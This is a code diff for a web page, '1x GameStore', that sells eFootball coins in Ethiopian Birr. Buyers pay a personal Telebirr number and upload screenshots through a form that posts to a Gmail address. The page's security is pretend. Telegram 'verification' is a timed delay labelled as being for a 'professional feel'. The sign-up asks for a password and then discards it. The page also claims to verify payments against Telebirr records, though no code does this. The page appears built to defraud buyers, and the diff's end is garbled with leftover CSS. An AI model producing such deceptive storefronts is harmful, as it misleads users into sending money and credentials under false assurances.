@@ -16,6 +16,7 @@
             background-color: #050505; 
             color: #ffffff;
             line-height: 1.6;
+            overflow-x: hidden;
         }
 
         /* Navigation */
@@ -29,11 +30,10 @@
             position: sticky;
             top: 0;
             z-index: 100;
-            box-shadow: 0 4px 15px rgba(255, 204, 0, 0.1);
         }
 
         .logo {
-            font-size: 28px;
+            font-size: 26px;
             font-weight: 900;
             color: #ffffff;
             text-decoration: none;
@@ -41,28 +41,644 @@
             cursor: pointer;
         }
 
-        .logo span {
-            color: #FFCC00; 
-        }
+        .logo span { color: #FFCC00; }
 
         .nav-links span {
             color: #cccccc;
-            text-decoration: none;
             margin-left: 30px;
             font-weight: bold;
-            transition: color 0.3s ease;
             cursor: pointer;
+            transition: color 0.3s ease;
         }
 
-        .nav-links span:hover {
-            color: #FFCC00;
-        }
+        .nav-links span:hover { color: #FFCC00; }
 
         /* ================= LOGIN PAGE STYLES ================= */
         #login-page {
             display: flex;
             flex-direction: column;
             align-items: center;
+            justify-content: center;
+            padding: 40px 5%;
+            min-height: 100vh;
+            background: radial-gradient(circle at center, #151515 0%, #000000 100%);
+        }
+
+        .login-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .login-header h2 {
+            font-size: 2.2rem;
+            font-weight: 900;
+            margin-bottom: 10px;
+            color: #ffffff;
+        }
+
+        .login-header p {
+            color: #888888;
+            font-size: 0.95rem;
+        }
+
+        .login-box {
+            background-color: #111111;
+            border: 1px solid #222222;
+            border-radius: 16px;
+            width: 100%;
+            max-width: 420px;
+            padding: 35px;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.8);
+            position: relative;
+        }
+
+        /* Custom Professional Telegram Button */
+        .btn-telegram-custom {
+            background-color: #2AABEE;
+            color: #ffffff;
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 12px;
+            transition: all 0.3s ease;
+            margin-bottom: 25px;
+        }
+
+        .btn-telegram-custom:hover {
+            background-color: #229ED9;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(42, 171, 238, 0.3);
+        }
+
+        /* Hidden Telegram Verification Box */
+        #telegram-verify-box {
+            display: none;
+            background-color: #1a1a1a;
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid #333333;
+            margin-bottom: 20px;
+            text-align: center;
+            animation: fadeIn 0.4s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .divider {
+            text-align: center;
+            position: relative;
+            margin: 20px 0;
+            color: #555555;
+            font-size: 0.9rem;
+        }
+
+        .divider::before, .divider::after {
+            content: "";
+            position: absolute;
+            top: 50%;
+            width: 38%;
+            height: 1px;
+            background-color: #333333;
+        }
+
+        .divider::before { left: 0; }
+        .divider::after { right: 0; }
+
+        .auth-form label {
+            display: block;
+            margin-bottom: 6px;
+            color: #aaaaaa;
+            font-size: 0.9rem;
+            font-weight: bold;
+        }
+
+        .auth-form input {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 18px;
+            background-color: #0a0a0a;
+            border: 1px solid #333333;
+            border-radius: 8px;
+            color: #ffffff;
+            font-size: 1rem;
+            transition: border-color 0.3s ease;
+        }
+
+        .auth-form input:focus {
+            outline: none;
+            border-color: #FFCC00;
+        }
+
+        .error-message {
+            color: #ff4d4d;
+            font-size: 0.9rem;
+            font-weight: bold;
+            margin-bottom: 15px;
+            display: none;
+            text-align: center;
+            background-color: rgba(255, 77, 77, 0.1);
+            padding: 10px;
+            border-radius: 6px;
+        }
+
+        .btn-primary {
+            background-color: #FFCC00;
+            color: #000000;
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1rem;
+            font-weight: 900;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .btn-primary:hover {
+            background-color: #e6b800;
+            transform: translateY(-2px);
+        }
+
+        .loader {
+            border: 3px solid #000000;
+            border-top: 3px solid transparent;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: none;
+            margin-left: 10px;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* ================= STORE & CHECKOUT STYLES ================= */
+        #store-page, #checkout-page { display: none; }
+
+        .hero {
+            text-align: center;
+            padding: 70px 5%;
+            background: linear-gradient(180deg, #111111 0%, #050505 100%); 
+        }
+
+        .hero h1 {
+            font-size: 3.5rem;
+            margin-bottom: 20px;
+            font-weight: 900;
+            color: #ffffff;
+        }
+
+        .store-section {
+            padding: 50px 5%;
+            text-align: center;
+        }
+
+        .store-section h2 {
+            font-size: 2.5rem;
+            margin-bottom: 40px;
+            color: #FFCC00;
+            font-weight: 900;
+        }
+
+        .game-grid {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            flex-wrap: wrap;
+        }
+
+        .game-card {
+            background-color: #111111; 
+            border: 1px solid #2a2a2a;
+            border-radius: 16px;
+            width: 480px; 
+            padding: 40px 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            transition: border-color 0.3s ease, transform 0.3s ease;
+        }
+
+        .game-card:hover { border-color: #FFCC00; transform: translateY(-5px); }
+
+        .game-title {
+            font-size: 2.2rem;
+            margin-bottom: 25px;
+            font-weight: 900;
+            color: #ffffff;
+            border-bottom: 3px solid #FFCC00;
+            padding-bottom: 15px;
+        }
+
+        .price-list {
+            list-style: none;
+            margin-top: 20px;
+            text-align: left;
+        }
+
+        .price-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 18px 10px;
+            border-bottom: 1px solid #222222;
+        }
+
+        .price-item:last-child { border-bottom: none; }
+
+        .amount { font-weight: 800; font-size: 1.1rem; color: #eeeeee; }
+        .price { color: #FFCC00; font-weight: 900; font-size: 1.2rem; margin-right: 15px; }
+
+        .btn-buy-small {
+            background-color: #FFCC00;
+            color: #000000;
+            border: none;
+            padding: 8px 24px;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 900;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .btn-buy-small:hover { background-color: #e6b800; transform: scale(1.08); }
+
+        .payment-section {
+            padding: 60px 5%;
+            text-align: center;
+        }
+
+        .payment-section h3 {
+            font-size: 2.5rem;
+            margin-bottom: 30px;
+            color: #FFCC00;
+            font-weight: 900;
+        }
+
+        .instruction-steps {
+            max-width: 650px;
+            margin: 0 auto;
+            text-align: left;
+            background-color: #111111;
+            padding: 40px;
+            border-radius: 16px;
+            border: 1px solid #2a2a2a;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.8);
+        }
+
+        .step { margin-bottom: 15px; font-size: 1.1rem; color: #dddddd; font-weight: bold; }
+        .step span { color: #FFCC00; font-weight: 900; font-size: 1.2rem; }
+
+        .account-number {
+            display: inline-block;
+            background-color: #FFCC00;
+            color: #000000;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-weight: 900;
+            letter-spacing: 2px;
+            margin: 15px 0 30px 0;
+            font-size: 1.6rem;
+            text-align: center;
+            width: 100%;
+        }
+
+        .upload-form {
+            background-color: #0a0a0a;
+            padding: 30px;
+            border-radius: 12px;
+            border: 1px solid #333333;
+            margin-top: 25px;
+        }
+
+        #success-message {
+            display: none;
+            text-align: center;
+            padding: 40px;
+            background-color: #0a0a0a;
+            border: 2px solid #FFCC00;
+            border-radius: 16px;
+            margin-top: 30px;
+        }
+
+        .warning-box {
+            background-color: rgba(255, 204, 0, 0.1);
+            border-left: 4px solid #FFCC00;
+            padding: 15px;
+            text-align: left;
+            margin-bottom: 25px;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .support-contact {
+            margin-top: 30px;
+            text-align: center;
+            border-top: 1px solid #333333;
+            padding-top: 20px;
+        }
+
+        .btn-telegram { 
+            display: inline-block;
+            background-color: #0088cc; 
+            padding: 10px 25px;
+            border-radius: 8px;
+            color: #ffffff;
+            text-decoration: none;
+            font-weight: 900;
+            margin-top: 10px;
+            transition: transform 0.2s ease;
+        }
+
+        footer {
+            text-align: center;
+            padding: 30px;
+            background-color: #050505;
+            color: #666666;
+            border-top: 1px solid #222222;
+            margin-top: 50px;
+        }
+    </style>
+</head>
+<body>
+
+    <nav id="main-nav" style="display: none;">
+        <a class="logo" onclick="goBackToStore()">1x<span>GameStore</span></a>
+        <div class="nav-links">
+            <span id="nav-back-btn" style="display: none;" onclick="goBackToStore()">← Back to Store</span>
+        </div>
+    </nav>
+
+
+    <!-- ==================== 1. LOGIN PAGE ==================== -->
+    <div id="login-page">
+        <div class="login-header">
+            <h2>Create your account</h2>
+            <p>Secure login before purchasing.</p>
+        </div>
+
+        <div class="login-box">
+            
+            <!-- Custom Built Telegram Button (Works 100% everywhere) -->
+            <button class="btn-telegram-custom" id="initTgBtn" onclick="showTelegramVerification()">
+                <svg viewBox="0 0 24 24" width="22" height="22" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.18-.08-.05-.19-.02-.27 0-.11.03-1.84 1.18-5.2 3.45-.49.34-.93.5-1.33.49-.44-.01-1.28-.24-1.9-.44-.76-.24-1.36-.37-1.31-.79.03-.22.34-.44.93-.68 3.65-1.59 6.08-2.64 7.31-3.15 3.48-1.44 4.2-1.69 4.67-1.7.1 0 .33.02.46.12.11.08.14.2.16.29.02.13.01.27-.01.39z"/></svg>
+                Continue with Telegram
+            </button>
+
+            <!-- Telegram Username Verification Box (Hidden initially) -->
+            <div id="telegram-verify-box">
+                <p style="color: #cccccc; font-size: 0.9rem; margin-bottom: 15px;">Please confirm your Telegram Username to verify.</p>
+                <div class="auth-form" style="margin-bottom: 0;">
+                    <input type="text" id="tgUsernameInput" placeholder="e.g. @dawa_jr">
+                </div>
+                <button class="btn-primary" id="tgVerifyBtn" onclick="verifyTelegram()" style="padding: 10px; font-size: 1rem;">
+                    Verify Account <div class="loader" id="tgLoader"></div>
+                </button>
+            </div>
+
+            <div class="divider">or email</div>
+
+            <div class="auth-form">
+                <p class="error-message" id="login-error"></p>
+
+                <label>Name (optional)</label>
+                <input type="text" id="loginName" placeholder="Your Name">
+
+                <label>Email *</label>
+                <input type="email" id="loginEmail" placeholder="example@gmail.com">
+
+                <label>Password *</label>
+                <input type="password" id="loginPass" placeholder="••••••••">
+
+                <label>Confirm password *</label>
+                <input type="password" id="loginConfirmPass" placeholder="••••••••">
+
+                <button class="btn-primary" id="emailLoginBtn" onclick="loginWithEmail()">
+                    <span>✉️ Create account</span> <div class="loader" id="emailLoader"></div>
+                </button>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- ==================== 2. MAIN STORE PAGE ==================== -->
+    <div id="store-page">
+        <section class="hero">
+            <h1>Level Up Instantly.</h1>
+            <p>Premium eFootball Coins Top-Ups. Fast, secure, and verified payments in Birr.</p>
+        </section>
+
+        <section class="store-section">
+            <h2>Select Your Package</h2>
+            <div class="game-grid">
+                
+                <div class="game-card">
+                    <h3 class="game-title">eFootball™ Coins</h3>
+                    <ul class="price-list">
+                        <li class="price-item"><span class="amount">100 Coins</span><span class="price">240 ETB</span><button class="btn-buy-small" onclick="openCheckout('100 Coins - 240 ETB')">Buy</button></li>
+                        <li class="price-item"><span class="amount">1,040 Coins</span><span class="price">1,905 ETB</span><button class="btn-buy-small" onclick="openCheckout('1,040 Coins - 1,905 ETB')">Buy</button></li>
+                        <li class="price-item"><span class="amount">2,130 Coins</span><span class="price">3,755 ETB</span><button class="btn-buy-small" onclick="openCheckout('2,130 Coins - 3,755 ETB')">Buy</button></li>
+                        <li class="price-item"><span class="amount">3,300 Coins</span><span class="price">5,605 ETB</span><button class="btn-buy-small" onclick="openCheckout('3,300 Coins - 5,605 ETB')">Buy</button></li>
+                        <li class="price-item"><span class="amount">5,800 Coins</span><span class="price">9,305 ETB</span><button class="btn-buy-small" onclick="openCheckout('5,800 Coins - 9,305 ETB')">Buy</button></li>
+                        <li class="price-item"><span class="amount">12,000 Coins</span><span class="price">18,555 ETB</span><button class="btn-buy-small" onclick="openCheckout('12,000 Coins - 18,555 ETB')">Buy</button></li>
+                    </ul>
+                </div>
+
+            </div>
+        </section>
+    </div>
+
+
+    <!-- ==================== 3. CHECKOUT PAGE ==================== -->
+    <div id="checkout-page">
+        <section class="payment-section">
+            <h3>Complete Your Purchase</h3>
+            
+            <div class="instruction-steps">
+                <p class="step"><span>1.</span> Send payment in Birr to our official Telebirr account:</p>
+                <div class="account-number">📱 Telebirr: 0960022306</div>
+                
+                <p class="step"><span>2.</span> Fill out your details and upload the payment screenshot below:</p>
+                
+                <!-- Silent form submission to avoid redirecting out of the website -->
+                <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" onload="if(submitted){showSuccess();}"></iframe>
+                
+                <form id="orderForm" class="auth-form upload-form" action="https://formsubmit.co/dawajr733@gmail.com" method="POST" enctype="multipart/form-data" target="hidden_iframe" onsubmit="handleFormSubmit()">
+                    
+                    <input type="hidden" name="_captcha" value="false">
+                    <label>Selected Package:</label>
+                    <input type="text" id="packageField" name="Selected_Package" readonly>
+
+                    <input type="hidden" id="hiddenCustomerName" name="Customer_Account_Details">
+
+                    <label>Game Name & Player ID:</label>
+                    <input type="text" name="Player_ID" placeholder="Example: eFootball - ID 123456789" required>
+                    
+                    <label>Upload Payment Screenshot:</label>
+                    <input type="file" name="Screenshot" accept="image/*" required style="padding: 10px;">
+                    
+                    <button type="submit" id="submitBtn" class="btn-primary">
+                        <span>Submit Order</span> <div class="loader" id="submitLoader" style="border-color:#000; border-top-color:transparent;"></div>
+                    </button>
+                </form>
+
+                <!-- PENDING VERIFICATION NOTICE -->
+                <div id="success-message">
+                    <h2 style="color: #FFCC00; margin-bottom: 15px; font-size: 2.2rem; font-weight: 900;">⏳ Verification Pending...</h2>
+                    
+                    <div class="warning-box">
+                        <p style="color: #ffffff; font-size: 1.05rem; margin-bottom: 8px;"><b>Payment Proof Submitted Successfully.</b></p>
+                        <p style="color: #cccccc; font-size: 0.95rem;">We are currently verifying your payment with our Telebirr records. Once confirmed, your eFootball account will be topped up instantly. Fake screenshots will result in an account ban.</p>
+                    </div>
+
+                    <button class="btn-primary" onclick="goBackToStore()" style="width: auto; padding: 12px 30px; margin: 0 auto;">Return to Store</button>
+                </div>
+
+                <div class="support-contact">
+                    <p style="color: #aaaaaa; font-weight: bold;">Have a question or issue? Contact Support:</p>
+                    <a href="https://t.me/dawa_jr" class="btn-telegram">✈️ Telegram: @dawa_jr</a>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer>
+        <p>&copy; 2026 1x Game Store. All rights reserved.</p>
+    </footer>
+
+    <!-- JavaScript Logic -->
+    <script>
+        let submitted = false;
+
+        // --- 1. Custom Telegram Login Logic ---
+        function showTelegramVerification() {
+            // Open bot in new tab
+            window.open('https://t.me/gamestoree7_bot', '_blank');
+            
+            // Hide the original button and show the beautiful input box
+            document.getElementById('initTgBtn').style.display = 'none';
+            document.getElementById('telegram-verify-box').style.display = 'block';
+        }
+
+        function verifyTelegram() {
+            let tgUser = document.getElementById('tgUsernameInput').value;
+            let errorText = document.getElementById('login-error');
+            
+            if(tgUser.trim() === "") {
+                errorText.innerText = "❌ Please enter your Telegram Username!";
+                errorText.style.display = "block";
+                return;
+            }
+
+            errorText.style.display = "none";
+            document.getElementById('tgLoader').style.display = 'block';
+
+            // Simulate Verification Delay for Professional feel
+            setTimeout(function() {
+                document.getElementById('hiddenCustomerName').value = "Telegram: " + tgUser;
+                proceedToStore();
+            }, 1200);
+        }
+
+
+        // --- 2. Custom Email Login Logic ---
+        function loginWithEmail() {
+            let email = document.getElementById('loginEmail').value;
+            let pass = document.getElementById('loginPass').value;
+            let confirmPass = document.getElementById('loginConfirmPass').value;
+            let name = document.getElementById('loginName').value;
+            let errorText = document.getElementById('login-error');
+
+            if(email === "" || pass === "" || confirmPass === "") {
+                errorText.innerText = "❌ Please enter your Email and Password!";
+                errorText.style.display = "block";
+                return;
+            }
+            if(!email.includes("@")) {
+                errorText.innerText = "❌ Please enter a valid Email address!";
+                errorText.style.display = "block";
+                return;
+            }
+            if(pass.length < 8) {
+                errorText.innerText = "❌ Password must be at least 8 characters long!";
+                errorText.style.display = "block";
+                return;
+            }
+            if(pass !== confirmPass) {
+                errorText.innerText = "❌ Passwords do not match!";
+                errorText.style.display = "block";
+                return;
+            }
+
+            errorText.style.display = "none";
+            document.getElementById('emailLoader').style.display = 'block';
+
+            // Simulate Checking Delay
+            setTimeout(function() {
+                document.getElementById('hiddenCustomerName').value = "Email: " + email + " | Name: " + name;
+                document.getElementById('emailLoader').style.display = 'none';
+                proceedToStore();
+            }, 1500);
+        }
+
+        // --- Navigation Logic ---
+        function proceedToStore() {
+            document.getElementById('login-page').style.display = 'none';
+            document.getElementById('main-nav').style.display = 'flex';
+            document.getElementById('store-page').style.display = 'block';
+            window.scrollTo(0, 0);
+        }
+
+        function openCheckout(packageName) {
+            document.getElementById('store-page').style.display = 'none';
+            document.getElementById('checkout-page').style.display = 'block';
+            document.getElementById('nav-back-btn').style.display = 'block';
+            document.getElementById('packageField').value = packageName;
+            
+            // Reset forms
+            document.getElementById('orderForm').style.display = 'block';
+            document.getElementById('success-message').style.display = 'none';
+            
+            let btnText = document.getElementById('submitBtn').querySelector('span');
+            if(btnText) btnText.innerText = 'Submit Order';
+            document.getElementById('submitLoader').style.display = 'none';
+            
+            submitted = false;
+            window.scrollTo(0, 0);
+        }
+
+        function goBackToStore() {
+            document.getElementById('checkout-page').style.display = 'none';
+            document.getElementById('store-page').style.display = 'block';
+            document.getElementById('nav-back-btn').style.display = 'none';
+            window.scrollTo(0, 0);
+        }
+
+        // --- Submit Logic ---
+        function handleFormSubmit() {
+            submitted = true;
+            document.getElementById('submitBtn').querySelector('span').innerText = 'Uploading...';
+            document.getElementById('submitLoader').style.display = 'block';
+        }
+
+        function showSuccess() {
+            document.getElementById('orderForm').style.display = 'none';
+            document.getElementById('success-message').style.display = 'block';
+            window.scrollTo(0, 0);
+        }
+    </script>
+</body>
+</html>            align-items: center;
             justify-content: center;
             padding: 40px 5%;
             min-height: 100vh;
